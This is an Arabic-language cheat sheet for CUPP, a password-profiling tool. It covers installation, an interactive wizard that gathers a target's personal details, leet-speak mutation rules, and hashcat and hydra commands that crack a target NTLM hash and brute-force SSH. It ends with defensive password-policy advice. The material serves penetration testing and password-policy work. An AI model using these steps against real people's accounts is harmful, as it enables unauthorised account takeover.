<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ورقة الغش CUPP (ملف تعريف كلمات مرور المستخدم المشترك).

[CUPP](https://github.com/Mebus/cupp) (ملف تعريف كلمات مرور المستخدم الشائعة) هو منشئ قاموس كلمات مرور متخصص مصمم للتوصيف البشري المستهدف. بدلاً من استخدام القواميس العامة، يقوم CUPP بإنشاء التباديل بناءً على التفاصيل الشخصية (الاسم المستهدف، والشريك، والحيوانات الأليفة، وتواريخ الميلاد، والشركة، والهوايات، وتنوعات الكلام، ومجموعات الأحرف الخاصة).

---

## جدول المحتويات

- [نظرة عامة وحالات الاستخدام](#overview--use-cases)
- [التثبيت](#التثبيت)
- [معالج ملفات التعريف التفاعلي (`-i`)](#interactive-profiling-wizard--i)
- [قواعد التكوين وLeet (`cupp.cfg`)](#configuration--leet-rules-cuppcfg)
- [تنزيل ودمج القواميس (`-l` & `-w`)](#downloading--دمج-القواميس--l---w)
- [إخراج الأنابيب إلى Hashcat & Hydra](#piping-output-to-hashcat--hydra)
- [إرشادات سياسة الرؤى الدفاعية وكلمة المرور](#defensive-insights--password-policy-guidelines)

---

## نظرة عامة وحالات الاستخدام

غالبًا ما تفشل هجمات القاموس التقليدية ضد كلمات المرور المعقدة التي تتبع أنماطًا يمكن التنبؤ بها من قبل الإنسان (على سبيل المثال، `John1984!`، `Sarah_Fluffy2022#`). يعالج CUPP هذا من خلال:
- جمع المعلومات الاستخبارية الشخصية الخاصة بالهدف.
- الجمع بين الأسماء وسنوات الميلاد والتواريخ المهمة وأسماء الحيوانات الأليفة.
- تطبيق الطفرات المبنية على القواعد (الأحرف الكبيرة، استبدال Lete Speak، الأحرف الخاصة، إلحاق رقم عشوائي).
- إنتاج قائمة كلمات محسّنة ومستهدفة أصغر بشكل كبير من `rockyou.txt` ولكن ذات صلة أعلى بالهدف.

---

## تثبيت
```bash
# Clone the repository
git clone https://github.com/Mebus/cupp.git
cd cupp

# Kali Linux / Debian repository (if available)
sudo apt-get update && sudo apt-get install -y cupp

# Check help options
python3 cupp.py -h
```
---

## معالج ملفات التعريف التفاعلية (`-i`)

قم بتشغيل موجه الاستبيان لإنشاء قائمة كلمات مخصصة:
```bash
python3 cupp.py -i
```
مثال على الإرشادات السريعة:
```text
[+] Insert the targets information:
> First Name: Alice
> Surname: Smith
> Nickname: ally
> Birthdate (DDMMYYYY): 15061992

[+] Insert partners information:
> Partners name: Bob
> Partners nickname: bobby
> Partners birthdate (DDMMYYYY): 04111990

[+] Insert child's information:
> Child's name: Charlie
> Child's nickname: char
> Child's birthdate (DDMMYYYY): 20082018

[+] Insert pet's info:
> Pet's name: Luna

[+] Insert company name:
> Company name: CyberCorp

[+] Do you want to add some special words about the victim? Y/n: y
> (comma separated): football, chelsea, guitar, devops

[+] Do you want to add special characters at the end of words? Y/n: y
[+] Do you want to add some random numbers at the end of words? Y/n: y
[+] Leet mode? (i.e. leet = 1337) Y/n: y
```
يتم إنشاء ملف الإخراج `alice.csv` (أو ملف نصي محدد) بآلاف الطفرات المخصصة (على سبيل المثال، `Alice1992!`، `LunaCharlie2018`، `CyberCorp@2022`).

---

## قواعد التكوين وLeet (`cupp.cfg`)

يتم التحكم في تكوين CUPP عبر `cupp.cfg`. تشمل الأقسام الرئيسية ما يلي:
```ini
[years]
# Set year range for automated suffix appending
years = 1970,1980,1985,1990,1995,2000,2010,2020,2023,2024,2025,2026

[nums]
# Common number patterns appended to passwords
nums = 1,12,123,1234,12345,123456,777,999,007,69

[special]
# Special character appending
chars = !,@,#,$,%,&,*,-,_

[leet]
# Leet speak substitutions
a = 4,@
b = 8
e = 3
i = 1,!
o = 0
s = 5,$
t = 7
```
قم بتحرير `cupp.cfg` للتكيف مع الإعدادات المحلية المستهدفة ومواصفات اللغة.

---

## تنزيل ودمج القواميس (`-l` و`-w`)

### 1. قم بتنزيل قوائم الكلمات المجمعة مسبقًا من المستودعات
تنزيل قوائم الكلمات اللغوية الافتراضية:
```bash
python3 cupp.py -l
```
### 2. تحسين قائمة الكلمات الموجودة باستخدام قواعد Leet / الخاصة
قم بتطبيق قواعد طفرة CUPP على قائمة الكلمات الموجودة:
```bash
python3 cupp.py -w /path/to/base_words.txt
```
---

## إخراج الأنابيب إلى Hashcat وHydra

قم بإدخال القاموس المخصص الذي تم إنشاؤه مباشرةً في أدوات القوة الغاشمة:

### تكسير تجزئات الهدف باستخدام Hashcat
```bash
# Generate targeted list
python3 cupp.py -i

# Run Hashcat against target NTLM hash
hashcat -m 1000 target_ntlm.hash alice.txt -r /usr/share/hashcat/rules/best64.rule
```
### المصادقة عبر الإنترنت باستخدام القوة الغاشمة مع Hydra
```bash
hydra -l alice -P alice.txt 192.168.1.50 ssh
```
---

## الرؤى الدفاعية وإرشادات سياسة كلمة المرور

- **حظر السمات الشخصية:** منع كلمات مرور المستخدم التي تحتوي على الأسماء الأولى للموظفين أو أسماء العائلة أو أسماء المستخدمين أو الأسماء التجارية للشركة أو تواريخ الميلاد.
- **فرض الطول على التعقيد:** تعد عبارة المرور المكونة من 16 حرفًا أو أكثر (على سبيل المثال، أربع كلمات عشوائية في القاموس) أكثر مرونة بشكل ملحوظ في مواجهة أدوات إنشاء الملفات الشخصية من نمط `NameYear!` المكون من 8 أحرف.
- **المصادقة متعددة العوامل (MFA):** قم بفرض رموز FIDO2 أو TOTP للأجهزة بحيث لا يمكن لإنشاء القاموس المخصص وحده أن يعرض الحسابات للخطر.